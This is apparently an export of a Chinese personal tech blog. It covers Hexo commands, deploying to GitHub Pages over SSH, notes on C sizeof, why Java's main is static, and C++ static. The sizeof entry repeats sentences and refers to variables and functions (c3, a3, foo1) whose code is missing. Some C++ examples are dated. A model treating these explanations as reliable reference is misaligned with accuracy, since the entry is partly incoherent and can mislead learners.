--debug</span><br></pre></td></tr></table></figure><p>在终端中显示调试信息并记录到 <code>debug.log</code>。当您碰到问题时，可以尝试用调试模式重新执行一次，并 [提交调试信息到GitHub。</p><h3 id="简洁模式"><a href="#简洁模式" class="headerlink" title="简洁模式"></a>简洁模式</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo --silent</span><br></pre></td></tr></table></figure><p>隐藏终端信息。</p><h3 id="自定义配置文件的路径"><a href="#自定义配置文件的路径" class="headerlink" title="自定义配置文件的路径"></a>自定义配置文件的路径</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo --config custom.yml</span><br></pre></td></tr></table></figure><p>自定义配置文件的路径，执行后将不再使用 <code>_config.yml</code>。</p><h3 id="显示草稿"><a href="#显示草稿" class="headerlink" title="显示草稿"></a>显示草稿</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo --draft</span><br></pre></td></tr></table></figure><p>显示 <code>source/_drafts</code> 文件夹中的草稿文章。</p><h3 id="自定义-CWD"><a href="#自定义-CWD" class="headerlink" title="自定义 CWD"></a>自定义 CWD</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo --cwd &#x2F;path&#x2F;to&#x2F;cwd</span><br></pre></td></tr></table></figure><p>自定义当前工作目录（Current working directory）的路径。</p><h1 id="Github"><a href="#Github" class="headerlink" title="Github"></a>Github</h1><h2 id="注册Github账号"><a href="#注册Github账号" class="headerlink" title="注册Github账号"></a>注册Github账号</h2><p>已经有Github帐号跳过此步，首先进入<a href="https://github.com/">Github</a>进行注册，用户名、邮箱和密码之后都需要用到，自己记好 。</p><h2 id="创建repository"><a href="#创建repository" class="headerlink" title="创建repository"></a>创建repository</h2><p>repository相当于一个仓库，用来放置你的代码文件。首先，登陆进入<a href="https://github.com/">Github</a>，并进入个人页面，选择<code>Repositories</code>(下图第一个红圈的地方)，然后<code>New</code>一个repository(下图第二个红圈的地方) </p><p><img src="/2018/05/09/hexo%E7%9A%84%E5%AE%89%E8%A3%85%E3%80%81%E9%85%8D%E7%BD%AE%E4%B8%8E%E4%BD%BF%E7%94%A8/hexo%E7%9A%84%E5%AE%89%E8%A3%85%E3%80%81%E9%85%8D%E7%BD%AE%E4%B8%8E%E4%BD%BF%E7%94%A8%5Cgithub%E4%BB%93%E5%BA%93%E5%88%9B%E5%BB%BA.png" alt="仓库创建"></p><p>创建时，只需要填写Repository name即可，当然这个名字的格式必须为<code>youname.github.io</code>，<strong>注意：</strong>此处的<code>youname</code>必须为你的github用户名，用户名是可以用来登陆的。 </p><p><img src="/2018/05/09/hexo%E7%9A%84%E5%AE%89%E8%A3%85%E3%80%81%E9%85%8D%E7%BD%AE%E4%B8%8E%E4%BD%BF%E7%94%A8/hexo%E7%9A%84%E5%AE%89%E8%A3%85%E3%80%81%E9%85%8D%E7%BD%AE%E4%B8%8E%E4%BD%BF%E7%94%A8%5C%E4%BB%93%E5%BA%93%E5%88%9B%E5%BB%BA2.png"></p><h2 id="部署本地文件到github"><a href="#部署本地文件到github" class="headerlink" title="部署本地文件到github"></a>部署本地文件到github</h2><p>既然Repository已经创建了，当然是先把博客放到<code>Github</code>上去看看效果。编辑<code>E：\hexo</code>下的<code>_config.yml</code>文件，建议使用Notepad++。 在<code>_config.yml</code>最下方，添加如下配置(记得一点，hexo的配置文件中任何’:’后面都是带一个空格的),如果配置以下命令出现<code>ERROR Deployer not found : github</code>，则参考上文的解决方法。 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">deploy: </span><br><span class="line">  type: git</span><br><span class="line">  repository: http:&#x2F;&#x2F;github.com&#x2F;Github用户名&#x2F;仓库名.github.io.git</span><br><span class="line">  branch: master</span><br></pre></td></tr></table></figure><p>配置好<code>_config.yml</code>并保存后，执行以下命令部署到Github上。如果你是第一次使用Github或者是已经使用过，但没有配置过SSH，则可能需要配置一下，本文的<a href="http://wuliekun.me/2018/05/09/hexo%E7%9A%84%E5%AE%89%E8%A3%85%E3%80%81%E9%85%8D%E7%BD%AE%E4%B8%8E%E4%BD%BF%E7%94%A8/#%E9%83%A8%E7%BD%B2%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6%E5%88%B0github">另一种发布到github的配置</a>一节有介绍。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ hexo g</span><br><span class="line">$ hexo d</span><br></pre></td></tr></table></figure><p>执行上面的第二个命令，可能会要你输入用户名和密码，皆为注册Github时的数据，输入密码是不显示任何东西的，输入完毕回车即可。<br>此时，我们的博客已经搭建起来，并发布到Github上了，这时可以登陆自己的Github查看代码是否已经推送到对应Repository，在浏览器访问<code>仓库名.github.io</code>就能看到自己的博客了。第一次访问地址，可能访问不了，您可以在几分钟后进行访问，一般不超过10分钟。</p><h2 id="发表一篇文章"><a href="#发表一篇文章" class="headerlink" title="发表一篇文章"></a>发表一篇文章</h2><p>1.在Git Bash执行命令：<code>$ hexo new &quot;my new post&quot;</code> 2.在<code>E:\hexo\source\_post</code>中打开my-new-post.md，打开方式使用记事本或notepad++。 hexo中写文章使用的是Markdown，没接触过的可以看下<a href="http://wowubuntu.com/markdown/#p">Markdown语法说明</a>,<a href="http://lutaf.com/markdown-simple-usage.htm">一分钟学会Markdown</a> </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">title: my new post #可以改成中文的，如“新文章”</span><br><span class="line">date: 2017-04-08 22:56:29 #发表日期，一般不改动</span><br><span class="line">categories: blog #文章文类</span><br><span class="line">tags: [博客，文章] #文章标签，多于一项时用这种格式，只有一项时使用tags: blog</span><br><span class="line">---</span><br><span class="line">#这里是正文，用markdown写，你可以选择写一段显示在首页的简介后，加上</span><br><span class="line">&lt;!--more--&gt; #在&lt;!--more--&gt;之前的内容会显示在首页，之后的内容会被隐藏，当游客点击Read more才能看到。</span><br></pre></td></tr></table></figure><p>写完文章后，你可以使用</p><ol><li><code>$ hexo g</code>生成静态文件。</li><li><code>$ hexo s</code>在本地预览效果。</li><li><code>$ hexo d</code>同步到github，</li></ol><p>然后使用<code>http://仓库名.github.io</code>进行访问。</p><h2 id="另一种发布到github的配置"><a href="#另一种发布到github的配置" class="headerlink" title="另一种发布到github的配置"></a>另一种发布到github的配置</h2><p> 有不少人反馈说无法发布到github，现在提供另一种配置方式，这种方式在发布时不需要输入密码，也是我目前使用的方法，配置代码如下。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">deploy: </span><br><span class="line">  type: git</span><br><span class="line">  repository: git@github.com:用户名&#x2F;仓库名.github.io.git</span><br><span class="line">  branch: master</span><br></pre></td></tr></table></figure><p>这种配置方式，需要配置SSH key，教程如下：<br>鼠标右键任意地方，选择Git Bash，</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ ssh-keygen -t rsa -C &quot;your_email@youremail.com&quot;</span><br></pre></td></tr></table></figure><p>后面的<a href="mailto:&#x79;&#111;&#x75;&#x72;&#95;&#x65;&#109;&#x61;&#105;&#108;&#x40;&#121;&#x6f;&#x75;&#114;&#101;&#109;&#x61;&#105;&#108;&#46;&#99;&#x6f;&#x6d;">&#x79;&#111;&#x75;&#x72;&#95;&#x65;&#109;&#x61;&#105;&#108;&#x40;&#121;&#x6f;&#x75;&#114;&#101;&#109;&#x61;&#105;&#108;&#46;&#99;&#x6f;&#x6d;</a>改为你的Github邮箱，之后会要求确认路径和输入密码，我们这使用默认的一路回车就行，成功的话会在<code>C:\Users\Administrator</code>下生成.ssh文件夹，进入该文件夹，以文本的形式打开id_rsa.pub，复制里面的key，即复制文件的全部内容。如果你在这边只看见2个id_rsa文件，没看到id_rsa.pub，应该是你把后缀名隐藏了，可以设置显示后缀，或者直接把两个文件都以文本的形式打开，内容短的并且以<code>ssh-rsa</code>开头的即为所需的SSH key。<br>回到github，进入Settings，选择SSH and GPG Keys -&gt; New SSH Key，title随便填，粘贴key。为了验证是否成功，在git bash下输入：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">$ ssh -T git@github.com</span><br></pre></td></tr></table></figure><p>如果是第一次的会提示是否continue，输入yes就会看到：You’ve successfully authenticated， but GitHub does not provide shell access ，这就表示已成功连上github。<br>接下来我们要做的就是把本地仓库传到github上去，在此之前还需要设置username和email，因为github每次commit都会记录他们。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ git config --global user.name &quot;your name&quot;  </span><br><span class="line">$ git config --global user.email &quot;your_email@youremail.com&quot;</span><br></pre></td></tr></table></figure><p>设置完后，使用<code>hexo d</code>命令发布内容就不需要再输入密码了。 </p><h2 id="清除缓存"><a href="#清除缓存" class="headerlink" title="清除缓存"></a>清除缓存</h2><p>清除缓存文件<code>db.json</code>和已生成的静态文件==<code>public</code>==。<br>在某些情况（尤其是更换主题后），如果发现您对站点的更改无论如何也不生效，您可能需要运行该命令。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo clean</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Hexo </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Hexo </tag>
            
            <tag> 前端 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>malloc</title>
      <link href="/2017/05/26/malloc/"/>
      <url>/2017/05/26/malloc/</url>
      
        <content type="html"><![CDATA[<p><a href="http://blog.csdn.net/msdnwolaile/article/details/51695361">malloc函数</a></p><p><a href="http://blog.csdn.net/u014170207/article/details/53126340">    realloc、malloc、以及calloc函数的区别</a></p>]]></content>
      
      
      <categories>
          
          <category> static </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C++ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sizeof详解</title>
      <link href="/2017/05/18/sizeof%E8%AF%A6%E8%A7%A3/"/>
      <url>/2017/05/18/sizeof%E8%AF%A6%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<h1 id="一-sizeof的概念"><a href="#一-sizeof的概念" class="headerlink" title="一 :sizeof的概念"></a>一 :sizeof的概念</h1><a id="more"></a>sizeof是C语言的一种单目操作，如C语言的其他操作++、——等等，它并不是函数。sizeof操作符`字节`形式给出了其操作的存储大小。操作数可以是一个表达式或者是在括号内的类型名。操作数的存储大小是由操作数的类型决定的<h1 id="二：sizeof的使用方法"><a href="#二：sizeof的使用方法" class="headerlink" title="二：sizeof的使用方法"></a>二：sizeof的使用方法</h1><p>1.用于数据类型</p><p>​    sizeof使用类型：sizeof(type)</p><p>​    数据类型必须用括号括住：sizeof(int )</p><p>其返回值类型为size_t，在头文件stddef.h中定义。这是一个依赖于编译系统的值，一</p><p>其返回值类型为size_t，在头文件stddef.h中定义。这是一个依赖于编译系统的值，一<br>般定义为</p><p>其返回值类型为size_t，在头文件stddef.h中定义。这是一个依赖于编译系统的值，一般定义为typedef unsigned int size_t;</p><p>2.用于变量</p><p>sizeof使用形式: sizeof(var_name) 或 sizeof　var_name</p><p>变量名可以不用括号括住.如sizeof (var_name)，sizeof　var_name等都是正确形式，带括号的用法更普遍，大多数程序员采用这种形式。　  </p><p><strong><u>注意</u></strong>    ：sizeof操作符不能用于函数类型，不完全类型或位字段。</p><p>​    不完全类型具有未知存储大小的数据类型，如未知存储大小的数据类型、未知内容的结构或联合类型、void类型等。</p><p>例如</p><p>sizeof(max)        若此时变量max定义为int max（）</p><p>sizeof(char_v)    若此时char_v定义为char　char_v[MAX]且MAX未知</p><p>sizeof(void)</p><p>以上都是不可以的</p><p>3.实际上，sizeof计算对象的大小也是转换成对对象类型的计算，也就是说，同种类型的不同对象其sizeof值都是一致的。这里，对象可以进一步延伸至表达式，即sizeof可以对一个表达式求值，编译器根据表达式的最终结果类型来确定大小，一般不会对表达式进行计算。如：</p><p>sizeof( 2 );// 2的类型为int，所以等价于 sizeof( int );</p><p>sizeof( 2 + 3.14 ); // 3.14的类型为double，2也会被提升成double类型，所以等价</p><p>sizeof( 2 + 3.14 ); // 3.14的类型为double，2也会被提升成double类型，所以等价于 sizeof( double );</p><p>4.sizeof也可以对一个函数调用求值，其结果是函数返回类型的大小，函数并不会被调用</p><p>sizeof也可以对一个函数调用求值，其结果是函数返回类型的大小，函数并不会被调用，我们来看一个完整的例子：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">char foo()</span><br><span class="line">&#123;</span><br><span class="line">printf(&quot;foo() has been called.&#x2F;n&quot;);</span><br><span class="line">return &#39;a&#39;;</span><br><span class="line">&#125;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">size_t sz &#x3D; sizeof( foo() );</span><br><span class="line">&#x2F;&#x2F; foo() 的返回值类型为char，所以sz &#x3D; sizeof(</span><br><span class="line">char )，foo()并不会被调用</span><br><span class="line">printf(&quot;sizeof( foo() ) &#x3D;%d&#x2F;n&quot;, sz);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>5.基本数据类型的sizeof</p><p>这里的基本数据类型指short、int，long、float、double这样的简单内置数据类型，由于它们都是和系统相关的，所以在不同的系统下取值可能不同，这务必引起我们的注意，尽量不要在这方面给自己程序的移植造成麻烦。一般的，在32位编译环境中，sizeof(int)的取值为4。</p><p>6.指针变量的sizeof</p><p>学过数据结构的你应该知道指针是一个很重要的概念，它记录了另一个对象的地址。既 然是来存放地址的，那么它当然等于计算机内部地址总线的宽度。所以在32位计算机中，一个指针变量的返回值必定是4（注意结果是以字节为单位），可以预计，在将来的64位系统中指针变量的sizeof结果为8。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">char* pc &#x3D; &quot;abc&quot;;</span><br><span class="line">int* pi;</span><br><span class="line">string* ps;</span><br><span class="line">char** ppc &#x3D; &amp;pc;</span><br><span class="line">void (*pf)();&#x2F;&#x2F; 函数指针</span><br><span class="line">sizeof( pc ); &#x2F;&#x2F; 结果为4</span><br><span class="line">sizeof( pi ); &#x2F;&#x2F; 结果为4</span><br><span class="line">sizeof( ps ); &#x2F;&#x2F; 结果为4</span><br><span class="line">sizeof( ppc ); &#x2F;&#x2F; 结果为4</span><br><span class="line">sizeof( pf );&#x2F;&#x2F; 结果为4</span><br></pre></td></tr></table></figure><p>指针变量的sizeof值与指针所指的对象没有任何关系，正是由于所有的指针变量所占内存大小相等，所以MFC消息处理函数使用两个参数WPARAM、LPARAM就能传递各种复杂的消息结构（使用指向结构体的指针）。</p><p>7.数组的sizeof</p><p>数组的sizeof值等于数组所占用的内存字节数，如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">char a1[] &#x3D; &quot;abc&quot;;</span><br><span class="line">int a2[3];</span><br><span class="line">sizeof( a1 ); &#x2F;&#x2F; 结果为4，字符 末尾还存在一个NULL终止符</span><br><span class="line">sizeof( a2 ); &#x2F;&#x2F; 结果为3*4&#x3D;12（依赖于int）</span><br></pre></td></tr></table></figure><p>一些朋友刚开始时把sizeof当作了求数组元素的个数，现在，你应该知道这是不对的，那么应该怎么求数组元素的个数呢Easy，通常有下面两种写法：</p><p><code>int c1 = sizeof( a1 ) / sizeof( char ); // 总长度/单个元素的长度</code></p><p><code>int c2 = sizeof( a1 ) / sizeof( a1[0] ); // 总长度/第一个元素的长度</code></p><p>也许当你试图回答c4的值时已经意识到c3答错了，是的，c3!=3。这里函数参数a3已不再是数组类型，而是蜕变成指针，相当于char* a3，为什么仔细想想就不难明白，我们调用函数foo1时，程序会在栈上分配一个大小为3的数组吗不会！数组是“传址”的，调用者只需将实参的地址传递过去，所以a3自然为指针类型（char*），c3的值也就为4.</p><p>8.结构体的sizeof</p><p>这是初学者问得最多的一个问题，所以这里有必要多费点笔墨。让我们先看一个结构体:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"> struct S1</span><br><span class="line">&#123;</span><br><span class="line">char c;</span><br><span class="line">int i;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>问sizeof(s1)等于多少聪明的你开始思考了，char占1个字节，int占4个字节，那么加起来就应该是5。是这样吗你在你机器上试过了吗也许你是对的，但很可能你是错的！VC6中按默认设置得到的结果为8。</p><p>总结：哎  今天写的实在是太烂了，考研路上继续努力！！！</p><p>1</p><p><img src="/2017/05/18/sizeof%E8%AF%A6%E8%A7%A3/sizeof%E8%AF%A6%E8%A7%A3%5Csizeof%EF%BC%88%E6%8C%87%E9%92%88%EF%BC%89.jpg" alt="sizeof（指针）"></p><p>  2<img src="/2017/05/18/sizeof%E8%AF%A6%E8%A7%A3/sizeof%E8%AF%A6%E8%A7%A3%5Csizeof(%E6%95%B0%E7%BB%84).jpg" alt="sizeof(数组)"></p><p> 3<img src="/2017/05/18/sizeof%E8%AF%A6%E8%A7%A3/sizeof%E8%AF%A6%E8%A7%A3%5Csizeof(%E7%BB%93%E6%9E%84%E4%BD%93).jpg" alt="sizeof(结构体)"></p><p> 4<img src="/2017/05/18/sizeof%E8%AF%A6%E8%A7%A3/sizeof%E8%AF%A6%E8%A7%A3%5Csizeof(%E5%87%BD%E6%95%B0%E5%90%8D).jpg" alt="sizeof(函数名)"></p><p>5</p><p> <img src="/2017/05/18/sizeof%E8%AF%A6%E8%A7%A3/sizeof%E8%AF%A6%E8%A7%A3%5Csizeof(%E5%87%BD%E6%95%B0%E5%8F%82%E6%95%B0).jpg" alt="sizeof(函数参数)"></p>]]></content>
      
      
      <categories>
          
          <category> sizeof </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C++ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java中main中的static</title>
      <link href="/2017/04/11/Java%E4%B8%ADmain%E4%B8%AD%E7%9A%84static/"/>
      <url>/2017/04/11/Java%E4%B8%ADmain%E4%B8%AD%E7%9A%84static/</url>
      
        <content type="html"><![CDATA[<p>上篇写的是static，这让我想起了为什么Java中main主方法中前面用static修饰</p><a id="more"></a><p><code>用static修饰的方法，无须产生类的实例对象就可以调用该方法</code>。 </p><p><code>没有static修饰的方法，需要产生一个类的实例对象才可以调用该方法</code>。</p><p><code>main方法是[Java](http://lib.csdn.net/base/javase)解释器调用的，那时候还没有任何对象产生</code>。</p><p>我们知道，在C/C++当中，这个main方法并不是属于某一个类的，它是<code>一个全局的方法</code>，所以当我们执行的时候，c++编译器很容易的就能找到这个main方法.</p><p>然而当我们执行一个java程序的时候，因为java都是<code>以类作为程序的组织单元</code>，当我们要执行的时候，我们并不知道这个main方法会放到哪个类当中，也不知道是否是要产生类的一个对象，为了解决程序的运行问题，我们将这个main方法定义为static，这样的话，当我们在执行一个java代码的时候，我们在命令提示符中写：java Point（Point为一个类），解释器就会在Point这个类当中，去调用这个静态的main方法，而不需要产生Point这个类的对象，当我们加载Point这个类的时候，那么main方法也被加载了，作为我们java程序的一个入口。</p><p>  main方法是一个程序的入口，如果写成非静态的，那么就必须实例化一个对象再来调用它，既然是入口这样肯定是不可以的；静态方法是属于类的，直接用类名就可以调用         </p><ul><li>static方法不需要创建对象 可以直接访问 这样main方法就不需要做特殊处理</li><li>static方法在静态数据区中，这样就可以直接调用不需要每次调用都要重新生成。</li><li>静态函数在调用时不用实例化 </li><li>静态,一上来就装入内存 </li></ul><p>不加的话 你怎么运行程序 好比连门都没你怎么进房子，so，static就相当于给你的主程序按个门方便进入。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mainID &#x3D; (*env)-&gt;GetStaticMethodID(env, mainClass, &quot;main&quot;,</span><br><span class="line">                                       &quot;([Ljava&#x2F;lang&#x2F;String;)V&quot;);</span><br></pre></td></tr></table></figure><p>这是jvm启动时的代码，直接去找static的，参数为String数组的main方法。</p>]]></content>
      
      
      <categories>
          
          <category> static </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>C++中static关键字</title>
      <link href="/2017/04/10/C-%E4%B8%ADstatic%E5%85%B3%E9%94%AE%E5%AD%97/"/>
      <url>/2017/04/10/C-%E4%B8%ADstatic%E5%85%B3%E9%94%AE%E5%AD%97/</url>
      
        <content type="html"><![CDATA[<h2 id="C-的static有两种用法："><a href="#C-的static有两种用法：" class="headerlink" title="C++的static有两种用法："></a>C++的static有两种用法：</h2><p>面向过程程序设计中的static和面向对象程序设计中的static。前者应用于普通变量和函数，不涉及类；后者主要说明static在类中的作用<a id="more"></a></p><h2 id="static的内部机制："><a href="#static的内部机制：" class="headerlink" title="static的内部机制："></a>static的内部机制：</h2><p>​     静态数据成员要在程序一开始运行时就必须存在。因为函数在程序运行中被调用，所以静态数据成员不能在任何函数内分配空间和初始化。</p><pre><code> 这样，它的空间分配有三个可能的地方，`一`是作为类的外部接口的头文件，那里有类声明；`二`是类定义的内部实现，那里有类的成员函数定义；`三`是应用程序的main（）函数前的全局数据声明和定义处。</code></pre><p>​    静态数据成员要实际地分配空间，故不能在类的声明中定义（只能声明数据成员）。<code>类声明只声明一个类的“尺寸和规格”</code>，<code>并不进行实际的内存分配</code>，所以在类声明中写成定义是错误的。它也不能在头文件中类声明的外部定义，因为那会造成在多个使用该类的源文件中，对其重复定义。</p><p>​    static被引入以告知编译器，将变量存储在程序的<code>静态存储区</code>而非栈上空间，静态数据成员按定义出现的<code>先后顺序依次初始化</code>，注意静态成员嵌套时，要<code>保证所嵌套的成员已经初始化</code>了。消除时的顺序是初始化的<code>反顺序</code>。</p><h1 id="1-面向过程设计中的static"><a href="#1-面向过程设计中的static" class="headerlink" title="1  面向过程设计中的static"></a>1  面向过程设计中的static</h1><h2 id="1-1-静态全局变量"><a href="#1-1-静态全局变量" class="headerlink" title="1.1  静态全局变量"></a>1.1  静态全局变量</h2><p>​    在全局变量前，加上关键字static，该变量就被定义成为一个静态全局变量。我们先举一个静态全局变量的例子，如下：</p><p> <img src="/2017/04/10/C-%E4%B8%ADstatic%E5%85%B3%E9%94%AE%E5%AD%97/C-%E4%B8%ADstatic%E5%85%B3%E9%94%AE%E5%AD%97%5C%E9%9D%99%E6%80%81%E5%85%A8%E5%B1%80%E5%8F%98%E9%87%8F.png" alt="静态全局变量"></p><h3 id="静态全局变量有如下特点："><a href="#静态全局变量有如下特点：" class="headerlink" title="静态全局变量有如下特点："></a>静态全局变量有如下特点：</h3><ul><li>1.该变量在全局数据区分配内存； </li><li>2.未经初始化的静态全局变量会被程序自动初始化为0（自动变量的值是随机的，除非它被显式初始化），如下图所示：</li></ul><p><img src="/2017/04/10/C-%E4%B8%ADstatic%E5%85%B3%E9%94%AE%E5%AD%97/C-%E4%B8%ADstatic%E5%85%B3%E9%94%AE%E5%AD%97%5C%E9%9D%99%E6%80%81%E5%85%A8%E5%B1%80%E5%8F%98%E9%87%8F%E4%B8%8D%E5%88%9D%E5%A7%8B%E5%8C%96.png" alt="静态全局变量不初始化"></p><ul><li>3.静态全局变量在声明它的整个文件都是可见的，而在文件之外是不可见的；</li></ul><p>​    静态变量都在全局数据区分配内存，包括后面将要提到的静态局部变量。对于一个完整的程序，在内存中的分布情况如下：</p><p><code> 代码区</code> ：</p><p><code>全局数据区（静态区）</code>：全局变量和静态变量的存储是放在一块的，初始化的全局变量和静态变量在一块区域，未初始化的全局变量和未初始化的静态变量在相邻的另一块区域。程序结束释放。</p><p><code>堆区</code>：程序员分配并释放的区域，像malloc(c),new(c++)</p><p><code>栈区</code>：由编译器自动分配释放，像局部变量，函数参数，都是在栈区。会随着作用于退出而释放空间。</p><h3 id="定义静态全局变量还有以下好处："><a href="#定义静态全局变量还有以下好处：" class="headerlink" title="定义静态全局变量还有以下好处："></a>定义静态全局变量还有以下好处：</h3><ul><li>1.静态全局变量不能被其它文件所用；</li><li>2.其它文件中可以定义相同名字的变量，不会发生冲突；  </li></ul><h2 id="1-2-静态局部变量"><a href="#1-2-静态局部变量" class="headerlink" title="1.2  静态局部变量"></a>1.2  静态局部变量</h2><p>在局部变量前，加上关键字static，该变量就被定义成为一个静态局部变量。 我们先举一个静态局部变量的例子，如下： </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">#include&lt;iostream&gt;</span><br><span class="line">using namespace std;</span><br><span class="line"></span><br><span class="line">void fn();</span><br><span class="line"></span><br><span class="line">int main() &#123;</span><br><span class="line">    fn();</span><br><span class="line">    fn();</span><br><span class="line">    fn();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void fn() &#123;</span><br><span class="line">    static int n &#x3D; 10;</span><br><span class="line">    n++;</span><br><span class="line">    cout &lt;&lt; n &lt;&lt; endl;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p> <img src="/2017/04/10/C-%E4%B8%ADstatic%E5%85%B3%E9%94%AE%E5%AD%97/C-%E4%B8%ADstatic%E5%85%B3%E9%94%AE%E5%AD%97%5C%E5%B1%80%E9%83%A8%E5%8F%98%E9%87%8F.png" alt="局部变量"></p><p>​    通常，在函数体内定义了一个变量，每当程序运行到该语句时都会给该局部变量分配<code>栈内存</code>。但随着系统**<em>退出函数体，系统就会收回栈内存**</em>，局部变量也相应失效。但有时候我们<strong>想要在两次调用之间对变量的值进行保存</strong>。通常的想法是：<code>定义一个全局变量去实现</code>。但是这样一来，变量就不在属于函数体了，不再受函数的控制，给程序的维护带来不便。</p><p>​    <strong><code>然而静态局部变量正好解决了 这个问题</code>**。静态局部变量保存在<code>全局数据区</code>,而不是保存栈中（前面说过：</strong>栈内的一般会随着函数的退出而释放空间**），<code>每次的值保持到下一次调用</code>（这是我们需要掌握的），直到下次赋新值。</p><h3 id="静态局部变量有以下的特点："><a href="#静态局部变量有以下的特点：" class="headerlink" title="静态局部变量有以下的特点："></a>静态局部变量有以下的特点：</h3><ul><li>1.该变量在全局数据区分配内存；</li><li>2.静态局部变量在程序执行到该对象的声明处时被首次初始化，即<strong>以后的函数调用不再进行初始化</strong>，也就是你第二次调用的时候，不会继续初始化，而会直接跳过 </li><li>3.静态局部变量一般在声明处初始化，如果没有显式初始化，会被程序自动初始化为0（如下图所展示）；</li><li>4.它始终驻留在全局数据区，<strong>直到程序运行结束</strong>。但<strong>其作用域为局部作用域</strong>，当定义它的函数或语句块结束时，其作用域随之结束；</li></ul><h2 id="1-3-静态函数"><a href="#1-3-静态函数" class="headerlink" title="1.3    静态函数"></a>1.3    静态函数</h2><p>​    在函数的返回类型前加上static关键字,函数即被定义为静态函数。静态函数与普通函数不同，它只能在声明它的文件当中可见，不能被其它文件使用。<br>静态函数的例子：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;iostream.h&gt;</span><br><span class="line">static void fn();&#x2F;&#x2F;声明静态函数</span><br><span class="line">void main()</span><br><span class="line">&#123;</span><br><span class="line"> 　　fn();</span><br><span class="line">&#125;</span><br><span class="line">void fn()&#x2F;&#x2F;定义静态函数</span><br><span class="line">&#123;</span><br><span class="line"> 　　int n&#x3D;10;</span><br><span class="line"> 　　cout&lt;&lt;n&lt;&lt;endl;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="定义静态函数的好处："><a href="#定义静态函数的好处：" class="headerlink" title="定义静态函数的好处："></a>定义静态函数的好处：</h3><ul><li>1.静态函数不能被其它文件所用； </li></ul><ul><li>2.其它文件中可以定义相同名字的函数，不会发生冲突；</li></ul><h1 id="二：面向对象的static关键（类中的static关键字）"><a href="#二：面向对象的static关键（类中的static关键字）" class="headerlink" 